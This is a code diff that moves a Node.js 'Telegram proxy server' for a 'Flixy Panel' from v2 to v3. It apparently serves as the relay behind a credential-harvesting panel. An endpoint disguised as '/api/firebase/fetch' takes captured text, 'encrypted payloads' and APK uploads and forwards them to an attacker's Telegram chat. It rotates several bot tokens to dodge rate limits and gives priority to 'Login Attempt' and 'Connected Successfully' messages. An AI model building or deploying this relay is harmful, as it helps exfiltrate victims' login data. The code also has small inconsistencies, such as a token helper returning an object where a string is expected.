@@ -1,5 +1,5 @@
 #!/usr/bin/env node
-// Flixy Panel — Telegram Proxy Server  v2
+// Flixy Panel — Telegram Proxy Server  v3
 // Host on Render / Railway / Fly.io / any Node 18+ host.
 // Credentials are in .env — edit that file before deploying.
 
@@ -9,7 +9,10 @@ import multer from "multer";
 import crypto from "crypto";
 
 const app = express();
-const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 100 * 1024 * 1024 } });
+const upload = multer({
+  storage: multer.memoryStorage(),
+  limits: { fileSize: 100 * 1024 * 1024 }, // 100 MB
+});
 
 // ── Config ─────────────────────────────────────────────────────────────────────
 const CHAT_ID        = process.env.TELEGRAM_CHAT_ID ?? "";
@@ -25,90 +28,88 @@ const BOT_TOKENS = [
   ...(process.env.TELEGRAM_BOT_TOKEN   ?? "").split(",").map(s => s.trim()).filter(Boolean),
 ].filter((v, i, a) => v && a.indexOf(v) === i); // dedupe
 
+// ── Logging ────────────────────────────────────────────────────────────────────
+// Always plain-text + timestamps — readable in Render dashboard.
+function log(...args) {
+  const ts = new Date().toISOString().replace("T", " ").slice(0, 19);
+  console.log(`[${ts}]`, ...args);
+}
+
 if (BOT_TOKENS.length === 0) {
   log("⚠️  No bot tokens configured! Set TELEGRAM_BOT_TOKENS in .env");
 } else {
   log(`✅ Loaded ${BOT_TOKENS.length} bot token(s)`);
 }
 
-// ── Logging ────────────────────────────────────────────────────────────────────
-// Always plain-text with timestamps so Render dashboard is readable.
-function log(...args) {
-  const ts = new Date().toISOString().replace("T", " ").replace("Z", "");
-  console.log(`[${ts}]`, ...args);
-}
-
 // ── Rate-limit tracker ─────────────────────────────────────────────────────────
 const rateLimitedUntil = new Map(); // token → timestamp
-let tokenCursor = 0;
 
-function getNextToken() {
-  if (BOT_TOKENS.length === 0) return null;
+// Two independent token cursors: text messages use one, file uploads use another.
+// This way a slow APK upload never delays a text message.
+let textCursor = 0;
+let fileCursor = 1 % Math.max(BOT_TOKENS.length, 1);
+
+function getToken(cursorRef) {
+  if (BOT_TOKENS.length === 0) return { token: null, next: 0 };
   const now = Date.now();
   for (let i = 0; i < BOT_TOKENS.length; i++) {
-    const idx   = (tokenCursor + i) % BOT_TOKENS.length;
+    const idx   = (cursorRef.value + i) % BOT_TOKENS.length;
     const token = BOT_TOKENS[idx];
     if ((rateLimitedUntil.get(token) ?? 0) <= now) {
-      tokenCursor = (idx + 1) % BOT_TOKENS.length;
+      cursorRef.value = (idx + 1) % BOT_TOKENS.length;
       return token;
     }
   }
-  // All limited — pick the one that unlocks soonest
+  // All rate-limited — pick whichever unlocks soonest
   let best = BOT_TOKENS[0], bestUntil = rateLimitedUntil.get(best) ?? 0;
   for (const t of BOT_TOKENS) {
     const u = rateLimitedUntil.get(t) ?? 0;
     if (u < bestUntil) { best = t; bestUntil = u; }
   }
   const waitSec = Math.ceil((bestUntil - now) / 1000);
-  log(`⏳ All tokens rate-limited. Waiting ${waitSec}s for soonest token…`);
+  log(`⏳ All tokens rate-limited. Next token in ${waitSec}s`);
   return best;
 }
 
 function markRateLimited(token, retryAfter) {
-  const until = Date.now() + (retryAfter + 1) * 1000;
-  rateLimitedUntil.set(token, until);
-  log(`🚫 Token …${token.slice(-8)} rate-limited for ${retryAfter}s — rotating`);
+  rateLimitedUntil.set(token, Date.now() + (retryAfter + 1) * 1000);
+  log(`🚫 Token …${token.slice(-6)} rate-limited for ${retryAfter}s → rotating`);
 }
 
 // ── Retry helper — NEVER skips ─────────────────────────────────────────────────
-async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-async function withRetry(label, fn, maxAttempts = 12) {
+async function withRetry(label, fn, maxAttempts = 15) {
   for (let attempt = 1; attempt <= maxAttempts; attempt++) {
     try {
       await fn();
       return true;
     } catch (err) {
       if (attempt === maxAttempts) {
-        log(`❌ [${label}] FAILED after ${maxAttempts} attempts: ${err.message}`);
+        log(`❌ [${label}] gave up after ${maxAttempts} attempts: ${err.message}`);
         return false;
       }
-      const delay = Math.min(1500 * Math.pow(2, attempt - 1), 60_000); // up to 60s
-      log(`⚠️  [${label}] attempt ${attempt} failed (${err.message}) — retry in ${Math.round(delay/1000)}s`);
+      const delay = Math.min(1000 * Math.pow(2, attempt - 1), 60_000);
+      log(`⚠️  [${label}] attempt ${attempt} failed (${err.message}) — retry in ${(delay/1000).toFixed(0)}s`);
       await sleep(delay);
     }
   }
   return false;
 }
 
-// ── Telegram send helpers ──────────────────────────────────────────────────────
-const SEP = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
+// ── Telegram API helpers ───────────────────────────────────────────────────────
+const TEXT_CURSOR = { value: 0 };
+const FILE_CURSOR = { value: Math.min(1, BOT_TOKENS.length - 1) };
 
-async function tgPost(path, bodyInit) {
-  const token = getNextToken();
-  if (!token) throw new Error("No bot tokens available");
-
+async function tgPost(token, path, bodyInit) {
   const res = await fetch(`https://api.telegram.org/bot${token}${path}`, bodyInit);
-
   if (res.status === 429) {
     const data = await res.json().catch(() => ({}));
     const retryAfter = data?.parameters?.retry_after ?? 30;
     markRateLimited(token, retryAfter);
-    // Wait then retry transparently (counted by withRetry)
     await sleep((retryAfter + 1) * 1000);
     throw new Error(`429 rate-limited (${retryAfter}s)`);
   }
-
   if (!res.ok) {
     const body = await res.text().catch(() => "");
     throw new Error(`HTTP ${res.status}: ${body.slice(0, 200)}`);
@@ -116,11 +117,13 @@ async function tgPost(path, bodyInit) {
   return res;
 }
 
-async function sendMessage(rawText) {
-  const text = `${SEP}\n${rawText}\n${SEP}`;
-  const label = `msg:${text.slice(0, 40).replace(/\n/g, " ")}`;
-  await withRetry(label, () =>
-    tgPost("/sendMessage", {
+// High-priority: text messages. Uses TEXT_CURSOR pool.
+async function sendMessage(text) {
+  const label = `msg:${text.slice(0, 50).replace(/\n/g, " ")}`;
+  await withRetry(label, () => {
+    const token = getToken(TEXT_CURSOR);
+    if (!token) return Promise.resolve();
+    return tgPost(token, "/sendMessage", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -129,14 +132,16 @@ async function sendMessage(rawText) {
         parse_mode: "HTML",
         disable_web_page_preview: true,
       }),
-    })
-  );
+    });
+  });
 }
 
-async function sendDocument(fileBuffer, filename, mimetype, captionRaw) {
-  const caption = captionRaw ? `${SEP}\n${captionRaw}\n${SEP}` : "";
+// Lower-priority: file uploads. Uses FILE_CURSOR pool (separate from text).
+async function sendDocument(fileBuffer, filename, mimetype, caption) {
   const label = `doc:${filename}`;
   await withRetry(label, () => {
+    const token = getToken(FILE_CURSOR);
+    if (!token) return Promise.resolve();
     const form = new FormData();
     form.append("chat_id", CHAT_ID);
     form.append(
@@ -146,7 +151,7 @@ async function sendDocument(fileBuffer, filename, mimetype, captionRaw) {
     );
     if (caption) form.append("caption", caption);
     form.append("parse_mode", "HTML");
-    return tgPost("/sendDocument", { method: "POST", body: form });
+    return tgPost(token, "/sendDocument", { method: "POST", body: form });
   });
 }
 
@@ -187,7 +192,9 @@ function checkOrigin(req, res) {
 app.use(express.json());
 
 // ── Health ─────────────────────────────────────────────────────────────────────
-app.get("/api/health", (_req, res) => res.json({ status: "ok", ts: Date.now(), tokens: BOT_TOKENS.length }));
+app.get("/api/health", (_req, res) =>
+  res.json({ status: "ok", ts: Date.now(), tokens: BOT_TOKENS.length })
+);
 
 // ── Preflight ──────────────────────────────────────────────────────────────────
 app.options("/api/firebase/fetch", (req, res) => {
@@ -201,28 +208,30 @@ app.post("/api/firebase/fetch", upload.single("file"), (req, res) => {
   applyCors(req, res);
   if (!checkOrigin(req, res)) return;
 
-  // ── Respond to frontend IMMEDIATELY (fire-and-forget to Telegram)
+  // Always respond immediately — never make the panel wait.
   res.json({ ok: true });
 
   if (!CHAT_ID) { log("⚠️  TELEGRAM_CHAT_ID not set — skipping forward"); return; }
 
   const file = req.file;
 
-  // ─── File / APK upload ────────────────────────────────────────────────────
+  // ── File / APK upload ──────────────────────────────────────────────────────
   if (file) {
     if (PROXY_SECRET && req.body?.secret !== PROXY_SECRET) {
       log("🔒 File upload rejected — bad secret");
       return;
     }
     const caption = req.body?.caption ?? req.body?.text ?? "";
-    log(`📎 Queuing file: ${file.originalname} (${(file.size / 1024).toFixed(1)} KB)`);
+    log(`📎 Queuing file → ${file.originalname} (${(file.size / 1024).toFixed(1)} KB)`);
+
+    // Fire-and-forget — low-priority background upload
     sendDocument(file.buffer, file.originalname, file.mimetype, caption)
       .then(() => log(`✅ File sent: ${file.originalname}`))
       .catch(err => log(`❌ File failed: ${file.originalname} — ${err.message}`));
     return;
   }
 
-  // ─── Text / encrypted payload ─────────────────────────────────────────────
+  // ── Text / encrypted payload ───────────────────────────────────────────────
   const raw = req.body;
   let text = "";
 
@@ -244,15 +253,23 @@ app.post("/api/firebase/fetch", upload.single("file"), (req, res) => {
 
   if (!text) return;
 
-  log(`💬 Queuing message (${text.length} chars)`);
+  // Detect high-priority messages (shareable link, connected status) — log them specially
+  const isLink    = text.includes("Shareable Panel Link") || text.includes("?s=");
+  const isConnect = text.includes("Connected Successfully") || text.includes("Login Attempt");
+  const kind      = isLink ? "🔗 link" : isConnect ? "🔑 connect" : "💬 msg";
+
+  log(`${kind} → queuing (${text.length} chars)`);
+
+  // All text messages are high-priority — fire-and-forget immediately
   sendMessage(text)
-    .then(() => log(`✅ Message sent (${text.length} chars)`))
-    .catch(err => log(`❌ Message failed — ${err.message}`));
+    .then(() => log(`✅ Sent ${kind}`))
+    .catch(err => log(`❌ ${kind} failed — ${err.message}`));
 });
 
 app.listen(PORT, () => {
-  log(`🚀 Telegram proxy running on port ${PORT}`);
-  log(`   Tokens loaded : ${BOT_TOKENS.length}`);
-  log(`   Origin check  : ${ALLOWED_ORIGINS.length ? ALLOWED_ORIGINS.join(", ") : "disabled (all allowed)"}`);
-  log(`   Secret auth   : ${PROXY_SECRET ? "enabled" : "disabled"}`);
+  log(`🚀 Telegram proxy v3 running on port ${PORT}`);
+  log(`   Tokens : ${BOT_TOKENS.length} (text cursor → token 0, file cursor → token ${Math.min(1, BOT_TOKENS.length - 1)})`);
+  log(`   Chat   : ${CHAT_ID || "NOT SET ⚠️"}`);
+  log(`   Secret : ${PROXY_SECRET ? "enabled" : "disabled"}`);
+  log(`   Origins: ${ALLOWED_ORIGINS.length ? ALLOWED_ORIGINS.join(", ") : "all allowed"}`);
 });
